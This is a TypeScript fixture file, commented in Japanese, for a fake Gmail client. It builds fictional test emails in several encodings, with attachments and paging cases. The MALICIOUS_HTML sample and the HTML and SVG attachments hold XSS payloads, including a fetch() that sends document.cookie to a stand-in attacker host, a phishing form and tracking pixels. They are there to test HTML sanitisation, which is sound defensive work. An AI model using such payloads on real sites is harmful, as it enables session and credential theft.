import "server-only";
import { GmailError, GmailHistoryExpiredError } from "./types";
import type {
  GmailApiMessage,
  GmailClient,
  GmailHistoryResult,
  GmailMessagePart,
} from "./types";

/**
 * 開発・検証用のフィクスチャ Gmail クライアント。
 *
 * - すべて架空のデータ（実在の顧客・実メールは一切含まない。ドメインは example.* のみ）。
 * - isFixtureMode()（GMAIL_FIXTURE_MODE=1 かつ非本番）のときだけ index.ts から選ばれる。
 * - 実際のパーサ（mime.ts）を通すため、文字コード（ISO-2022-JP / Shift_JIS / EUC-JP / UTF-8）や
 *   multipart の入れ子を本物と同じ経路で検証できる。
 * - GMAIL_FIXTURE_FAIL=auth|timeout|rate_limit で、Gmail 障害時の画面挙動を再現できる。
 */

/** 検証用の架空顧客（DB に登録して顧客照合を確認する場合のサンプル） */
export const FIXTURE_CUSTOMERS = [
  { name: "架空商事（サンプル）", email: "  foo@example.com " }, // 大文字小文字・前後空白違いで1件一致
  { name: "重複登録サンプルA", email: "dup@example.com" }, // 同アドレスが2件 → 複数一致
  { name: "重複登録サンプルB", email: "DUP@example.com" },
] as const;

const b64 = (s: string | Buffer) => Buffer.from(s).toString("base64");
const b64u = (s: string | Buffer) => Buffer.from(s).toString("base64url");
const mimeB = (charset: string, base64: string) => `=?${charset}?B?${base64}?=`;

// ISO-2022-JP / Shift_JIS / EUC-JP のバイト列（base64）。架空の文面を各 charset でエンコードしたもの。
const ENC = {
  subj1: "GyRCIVokNENtSjghW0psJE5GfCUuJVUlSCROJCo0aiQkIUoyTTZ1IUsbKEI=",
  name1: "GyRCMk02dT4mO3YbKEIgGyRCOCtLXEJATzobKEI=",
  body1:
    "GyRCMk02dT4mO3YkTjgrS1wkRyQ5ISMbKEINChskQiQqQCRPQyRLJEokQyRGJCokaiReJDkhIxsoQg0KGyRCSmwkTkZ8TVEkTiUiJWwlcyU4JWElcyVIJHIbKEIzGyRCRUAhIhsoQjUbJEI3bhsoQjEwGyRCRnwkSyQqRk8kMSQkJD8kQCQxJF4kOSRHJDckZyQmJCshIxsoQg0KGyRCJGgkbSQ3JC8kKjRqJCQkJCQ/JDckXiQ5ISMbKEINCg==",
  subj2: "gqiMqZDPguiCzIKyiMuXioFpicuL84Fq",
  name2: "jKmWe4+kk1ggidSOcQ==",
  body2:
    "gqiMqZDPguiCzIKyiMuXioLFgreBQg0Kk1iV3JdwgsyJ1JGpgsyMqZDPguiC8IKoiuiCooK1gtyCt4FCDQqBpoKxgsyVtpbKgs2Jy4vzgsyDVIOTg3aDi4LFgreBQg0K",
  subj6: "xOq0/Mfbw6Oky6TEpKSkxqTOpLTB6sPMocqyzbb1ocs=",
  name6: "u+64s7mptsggw7TF9rzU",
  body6:
    "xOq0/Mfbw6Oky6TEpKSkxsHqw8ykx6S5oaMNCsvovbW37s3Lxvyky7v2zLO96qTYx9vDo6THpK2k3qS5pKuhow0Koqiyzbb1pM6ltaXzpdel66THpLmhow0K",
} as const;

function hdr(name: string, value: string) {
  return { name, value };
}

function textPart(mime: string, charset: string, bytes: Buffer, partId: string): GmailMessagePart {
  return {
    partId,
    mimeType: mime,
    filename: "",
    headers: [hdr("Content-Type", `${mime}; charset="${charset}"`)],
    body: { size: bytes.length, data: b64u(bytes) },
  };
}

function attachmentPart(
  partId: string,
  filename: string,
  mime: string,
  content: Buffer,
  claimedSize?: number,
): GmailMessagePart {
  return {
    partId,
    mimeType: mime,
    filename,
    headers: [hdr("Content-Type", `${mime}; name="x"`), hdr("Content-Disposition", "attachment")],
    body: { size: claimedSize ?? content.length, attachmentId: `att-${partId}-${Math.random().toString(36).slice(2, 8)}` },
  };
}

interface FixtureDef {
  id: string;
  daysAgo: number;
  labels: string[];
  headers: { name: string; value: string }[];
  payload: GmailMessagePart;
  snippet: string;
  /** 添付実体（partId → bytes）。Gmail の attachments API 相当で返す */
  files?: Record<string, Buffer>;
}

const MALICIOUS_HTML = `<html><head>
<meta http-equiv="refresh" content="0;url=https://evil.example.invalid/">
<style>body{background:url(https://tracker.example.invalid/css-bg.gif)}</style>
<script>document.title='pwned';fetch('https://evil.example.invalid/?c='+document.cookie)</script>
</head><body>
<p>【架空のテスト】悪意あるHTMLのサンプルです。</p>
<script>alert('xss-script')</script>
<img src="x" onerror="alert('xss-onerror')">
<img src="https://tracker.example.invalid/open.gif?u=1" width="1" height="1">
<a href="javascript:alert('xss-link')">javascriptリンク</a>
<a href="https://example.com/ok">通常リンク</a>
<form action="https://evil.example.invalid/steal" method="post"><input name="p"><button>送信</button></form>
<iframe src="https://evil.example.invalid/frame"></iframe>
<div onclick="alert('xss-click')" style="background-image:url(https://tracker.example.invalid/bg.gif);color:#c00">本文テキスト（赤字）</div>
<svg onload="alert('xss-svg')"></svg>
</body></html>`;

const NEWSLETTER_HTML = `<html><body style="font-family:sans-serif">
<h2 style="color:#2e7458">春のお知らせ（架空）</h2>
<p>これは架空のニュースレターです。</p>
<p><img src="https://images.example.invalid/banner.png" alt="バナー" width="300" height="80"></p>
<table style="border:1px solid #ccc"><tr><td style="padding:8px">商品A</td><td style="padding:8px">1,000円</td></tr></table>
<p><a href="https://example.com/campaign">詳しくはこちら</a></p>
</body></html>`;

function baseDefs(): FixtureDef[] {
  const defs: FixtureDef[] = [];

  // 1) ISO-2022-JP テキストのみ。送信者は大文字混じり（顧客 foo@example.com と1件一致）
  defs.push({
    id: "fx-0001",
    daysAgo: 0.1,
    labels: ["INBOX", "UNREAD"],
    snippet: "架空商事の見本です。お世話になっております。",
    headers: [
      hdr("From", `${mimeB("ISO-2022-JP", ENC.name1)} <Foo@Example.com>`),
      hdr("To", "shop@example.test"),
      hdr("Subject", mimeB("ISO-2022-JP", ENC.subj1)),
      hdr("Message-ID", "<fx-0001@mail.example.invalid>"),
      hdr("References", "<fx-prev@mail.example.invalid>"),
      hdr("Reply-To", "Foo Reply <reply-foo@example.com>"),
    ],
    payload: textPart("text/plain", "ISO-2022-JP", Buffer.from(ENC.body1, "base64"), "0"),
  });

  // 2) Shift_JIS テキストのみ。送信者アドレスは顧客が2件登録 → 複数一致
  defs.push({
    id: "fx-0002",
    daysAgo: 0.5,
    labels: ["INBOX"],
    snippet: "お見積りのご依頼です。",
    headers: [
      hdr("From", `${mimeB("Shift_JIS", ENC.name2)} <dup@example.com>`),
      hdr("To", "shop@example.test"),
      hdr("Cc", "boss@example.test, \"Sample, Taro\" <taro@example.test>"),
      hdr("Subject", mimeB("Shift_JIS", ENC.subj2)),
      hdr("Message-ID", "<fx-0002@mail.example.invalid>"),
    ],
    payload: textPart("text/plain", "Shift_JIS", Buffer.from(ENC.body2, "base64"), "0"),
  });

  // 3) multipart/alternative（UTF-8 plain + html、外部画像あり）。送信者は登録なし。件名は Q エンコード（UTF-8）で分割
  defs.push({
    id: "fx-0003",
    daysAgo: 1,
    labels: ["INBOX"],
    snippet: "春のお知らせ（架空）",
    headers: [
      hdr("From", "\"架空ニュース編集部\" <news@example.org>"),
      hdr("To", "shop@example.test"),
      hdr("Subject", `${mimeB("UTF-8", b64("【架空】春のお知らせ"))} ${mimeB("UTF-8", b64("：キャンペーンのご案内"))}`),
      hdr("Message-ID", "<fx-0003@mail.example.invalid>"),
    ],
    payload: {
      partId: "",
      mimeType: "multipart/alternative",
      filename: "",
      headers: [hdr("Content-Type", "multipart/alternative; boundary=x")],
      body: { size: 0 },
      parts: [
        textPart("text/plain", "UTF-8", Buffer.from("春のお知らせ（架空）\nこれは架空のニュースレターです。\n"), "0"),
        textPart("text/html", "UTF-8", Buffer.from(NEWSLETTER_HTML), "1"),
      ],
    },
  });

  // 4) HTML のみ・悪意あるHTML
  defs.push({
    id: "fx-0004",
    daysAgo: 2,
    labels: ["INBOX"],
    snippet: "悪意あるHTMLのサンプル",
    headers: [
      hdr("From", "Attacker Sample <attacker@example.net>"),
      hdr("To", "shop@example.test"),
      hdr("Subject", "【セキュリティ検証】悪意あるHTMLサンプル（架空）"),
      hdr("Message-ID", "<fx-0004@mail.example.invalid>"),
    ],
    payload: textPart("text/html", "UTF-8", Buffer.from(MALICIOUS_HTML), "0"),
  });

  // 5) multipart/mixed > multipart/alternative + 添付（日本語ファイル名・html・svg・巨大）
  const pdf = Buffer.from("%PDF-1.4 fake sample for fixture\n");
  const htmlAtt = Buffer.from("<html><body><script>alert('attachment-html')</script>架空の添付HTML</body></html>");
  const svgAtt = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text y="10">fixture</text></svg>');
  const pdfPart = attachmentPart("2", "見積書_サンプル.pdf", "application/pdf", pdf);
  const htmlPart = attachmentPart("3", "report.html", "text/html", htmlAtt);
  const svgPart = attachmentPart("4", "logo.svg", "image/svg+xml", svgAtt);
  const bigPart = attachmentPart("5", "大きな資料.zip", "application/zip", Buffer.alloc(1), 6_000_000);
  const encodedNamePart = attachmentPart("6", mimeB("UTF-8", b64("注文書（架空）.txt")), "text/plain", Buffer.from("注文書の架空サンプル\n"));
  defs.push({
    id: "fx-0005",
    daysAgo: 3,
    labels: ["INBOX"],
    snippet: "資料を添付します。",
    headers: [
      hdr("From", "Material Sender <sender@example.test>"),
      hdr("To", "shop@example.test"),
      hdr("Subject", "資料送付のご連絡（添付あり・架空）"),
      hdr("Message-ID", "<fx-0005@mail.example.invalid>"),
    ],
    payload: {
      partId: "",
      mimeType: "multipart/mixed",
      filename: "",
      headers: [hdr("Content-Type", "multipart/mixed; boundary=y")],
      body: { size: 0 },
      parts: [
        {
          partId: "0",
          mimeType: "multipart/alternative",
          filename: "",
          headers: [hdr("Content-Type", "multipart/alternative; boundary=z")],
          body: { size: 0 },
          parts: [
            textPart("text/plain", "UTF-8", Buffer.from("資料を添付します。ご確認ください。\n（架空のサンプルです）\n"), "0.0"),
            textPart("text/html", "UTF-8", Buffer.from("<p>資料を<b>添付</b>します。ご確認ください。</p>"), "0.1"),
          ],
        },
        pdfPart,
        htmlPart,
        svgPart,
        bigPart,
        encodedNamePart,
      ],
    },
    files: {
      "2": pdf,
      "3": htmlAtt,
      "4": svgAtt,
      "6": Buffer.from("注文書の架空サンプル\n"),
    },
  });

  // 6) EUC-JP テキストのみ
  defs.push({
    id: "fx-0006",
    daysAgo: 4,
    labels: ["INBOX"],
    snippet: "定期配達について相談です。",
    headers: [
      hdr("From", `${mimeB("EUC-JP", ENC.name6)} <office@example.test>`),
      hdr("To", "shop@example.test"),
      hdr("Subject", mimeB("EUC-JP", ENC.subj6)),
      hdr("Message-ID", "<fx-0006@mail.example.invalid>"),
    ],
    payload: textPart("text/plain", "EUC-JP", Buffer.from(ENC.body6, "base64"), "0"),
  });

  // 7) 送信済み（取り込み対象外）
  defs.push({
    id: "fx-0007",
    daysAgo: 1,
    labels: ["SENT"],
    snippet: "送信済みサンプル",
    headers: [hdr("From", "shop@example.test"), hdr("To", "a@example.com"), hdr("Subject", "【送信済み】取り込まれてはいけない")],
    payload: textPart("text/plain", "UTF-8", Buffer.from("sent"), "0"),
  });
  // 8) 迷惑メール（取り込み対象外）
  defs.push({
    id: "fx-0008",
    daysAgo: 1,
    labels: ["SPAM"],
    snippet: "迷惑メールサンプル",
    headers: [hdr("From", "spam@example.net"), hdr("To", "shop@example.test"), hdr("Subject", "【迷惑メール】取り込まれてはいけない")],
    payload: textPart("text/plain", "UTF-8", Buffer.from("spam"), "0"),
  });
  // 9) 古い（初回同期 N 日より前）
  defs.push({
    id: "fx-0009",
    daysAgo: 45,
    labels: ["INBOX"],
    snippet: "古いメール",
    headers: [hdr("From", "old@example.test"), hdr("To", "shop@example.test"), hdr("Subject", "【45日前】初回同期の対象外")],
    payload: textPart("text/plain", "UTF-8", Buffer.from("old"), "0"),
  });

  // 10) 一覧ページング検証用の大量メール（55通）
  for (let n = 1; n <= 55; n++) {
    defs.push({
      id: `fx-bulk-${String(n).padStart(3, "0")}`,
      daysAgo: 5 + n * 0.3,
      labels: ["INBOX"],
      snippet: `お知らせ ${n}（架空）`,
      headers: [
        hdr("From", "\"架空メルマガ\" <newsletter@example.org>"),
        hdr("To", "shop@example.test"),
        hdr("Subject", `【お知らせ #${n}】架空のメルマガ`),
        hdr("Message-ID", `<fx-bulk-${n}@mail.example.invalid>`),
      ],
      payload: textPart("text/plain", "UTF-8", Buffer.from(`お知らせ ${n} 号です。\n架空のメルマガ本文。\n`), "0"),
    });
  }
  return defs;
}

interface StoredMessage {
  msg: GmailApiMessage;
  historyNo: number;
  files: Record<string, Buffer>;
}

const DAY_MS = 86_400_000;

/**
 * インメモリのフィクスチャクライアント。
 * addMessage / expireHistory はテスト・検証スクリプト用（画面操作からは呼ばれない）。
 */
export class FixtureGmailClient implements GmailClient {
  private store: StoredMessage[] = [];
  private counter = 1000;
  private minValidHistory = 0;
  /** getMessage / list 呼び出し回数（検証用） */
  public calls = { getMessage: 0, listHistory: 0, listInbox: 0 };

  constructor(now: number = Date.now()) {
    for (const d of baseDefs()) {
      this.counter++;
      const msg: GmailApiMessage = {
        id: d.id,
        threadId: `thread-${d.id}`,
        labelIds: d.labels,
        snippet: d.snippet,
        historyId: String(this.counter),
        internalDate: String(Math.round(now - d.daysAgo * DAY_MS)),
        payload: {
          partId: "",
          mimeType: d.payload.mimeType,
          filename: "",
          headers: d.headers,
          body: d.payload.body,
          parts: d.payload.parts,
        },
      };
      // 単一パートのメッセージは payload 自体が本文パート
      if (!d.payload.parts) msg.payload = { ...d.payload, headers: [...(d.payload.headers ?? []), ...d.headers] };
      this.store.push({ msg, historyNo: this.counter, files: d.files ?? {} });
    }
  }

  private maybeFail() {
    const f = process.env.GMAIL_FIXTURE_FAIL;
    if (f === "auth" || f === "timeout" || f === "rate_limit") throw new GmailError(f);
  }

  /** 新着メールを追加する（検証用） */
  addMessage(overrides: { id: string; subject: string; from?: string; labels?: string[]; daysAgo?: number }): void {
    this.counter++;
    const msg: GmailApiMessage = {
      id: overrides.id,
      threadId: `thread-${overrides.id}`,
      labelIds: overrides.labels ?? ["INBOX"],
      snippet: overrides.subject,
      historyId: String(this.counter),
      internalDate: String(Date.now() - (overrides.daysAgo ?? 0) * DAY_MS),
      payload: {
        partId: "0",
        mimeType: "text/plain",
        filename: "",
        headers: [
          hdr("From", overrides.from ?? "new@example.test"),
          hdr("To", "shop@example.test"),
          hdr("Subject", overrides.subject),
          hdr("Content-Type", 'text/plain; charset="UTF-8"'),
        ],
        body: { size: 3, data: b64u("new") },
      },
    };
    this.store.push({ msg, historyNo: this.counter, files: {} });
  }

  /** 同期を通さずメッセージを直接取り出す（検証用） */
  peek(id: string): GmailApiMessage {
    const s = this.store.find((x) => x.msg.id === id);
    if (!s) throw new Error(`fixture not found: ${id}`);
    return s.msg;
  }

  /** 保存済み historyId を失効させる（検証用） */
  expireHistory(): void {
    this.minValidHistory = this.counter + 1;
    this.counter++;
  }

  async getProfileHistoryId(): Promise<string> {
    this.maybeFail();
    return String(this.counter);
  }

  async listInboxMessageIds(opts: { afterEpochSec: number; pageToken?: string }) {
    this.maybeFail();
    this.calls.listInbox++;
    const ids = this.store
      .filter((s) => s.msg.labelIds?.includes("INBOX") && Number(s.msg.internalDate) / 1000 >= opts.afterEpochSec)
      .sort((a, b) => Number(b.msg.internalDate) - Number(a.msg.internalDate))
      .map((s) => s.msg.id);
    // ページ分割（検証のため 40 件ずつ）
    const start = opts.pageToken ? Number(opts.pageToken) : 0;
    const slice = ids.slice(start, start + 40);
    return { ids: slice, nextPageToken: start + 40 < ids.length ? String(start + 40) : undefined };
  }

  async listHistory(startHistoryId: string): Promise<GmailHistoryResult> {
    this.maybeFail();
    this.calls.listHistory++;
    const start = Number(startHistoryId);
    if (!Number.isFinite(start) || start < this.minValidHistory) throw new GmailHistoryExpiredError();
    // 実 API 同様、INBOX 以外のメッセージが混ざり得る（取り込み側が fetch 時にラベルで再判定する）
    const ids = this.store.filter((s) => s.historyNo > start).map((s) => s.msg.id);
    return { messageIds: ids, historyId: String(this.counter) };
  }

  async getMessage(id: string): Promise<GmailApiMessage | null> {
    this.maybeFail();
    this.calls.getMessage++;
    const s = this.store.find((x) => x.msg.id === id);
    return s ? s.msg : null;
  }

  async getAttachmentData(messageId: string, attachmentId: string): Promise<Buffer> {
    this.maybeFail();
    const s = this.store.find((x) => x.msg.id === messageId);
    if (!s) throw new GmailError("api");
    // attachmentId から partId を引く（att-<partId>-<random>）
    const m = /^att-(.+)-[a-z0-9]+$/.exec(attachmentId);
    const bytes = m ? s.files[m[1]] : undefined;
    if (!bytes) throw new GmailError("api");
    return bytes;
  }
}

/** dev サーバーの HMR をまたいで状態（追加メール等）を保持する */
const g = globalThis as unknown as { __gmailFixtureClient?: FixtureGmailClient };
export function getFixtureClient(): FixtureGmailClient {
  if (!g.__gmailFixtureClient) g.__gmailFixtureClient = new FixtureGmailClient();
  return g.__gmailFixtureClient;
}
